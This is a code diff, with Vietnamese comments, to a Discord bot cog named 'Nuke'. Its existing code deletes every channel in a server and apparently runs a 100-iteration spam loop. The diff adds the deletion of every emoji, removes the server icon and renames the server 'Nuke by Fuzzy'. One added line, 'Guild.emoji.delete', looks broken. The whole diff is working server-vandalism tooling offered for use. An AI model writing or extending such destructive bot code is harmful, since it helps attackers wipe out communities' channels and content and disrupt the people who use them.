@@ -15,7 +15,15 @@ class Nuke(commands.Cog):
         
         delete_all = [channel.delete(reason='nuke by fuzzy-chan') for channel in Guild.channels]
         await asyncio.gather(* delete_all)
-        
+
+
+        # xóa mọi emoji trong máy chủ
+        try:
+            for emote in tuple(Guild.emojis):
+                await emote.delete(reason = 'NUKE BY FUZZY-CHAN')
+        except Exception as Error_On_Delete_Emoji:
+            print(f'>>> Gặp lỗi khi xóa emoji ^^^{Error_On_Delete_Emoji}')
+
         number = 0
         while number < 100: 
             await asyncio.sleep(0.75)
@@ -23,13 +31,17 @@ class Nuke(commands.Cog):
             number += 1
 
         await Guild.edit(
+            icon = None,
+            name = 'Nuke by Fuzzy',
             reason = 'Nuke by Fuzzy-chan',
             description = 'Server bị nuke bởi Fuzzy-chan',
             community = False
             )
         print('>>> SPAM.....')
 
+        # xóa mọi emoji trong máy chủ
 
+        await Guild.emoji.delete(reason = 'Nuke by Fuzzy-chan')
 
 
 async def setup(bot):
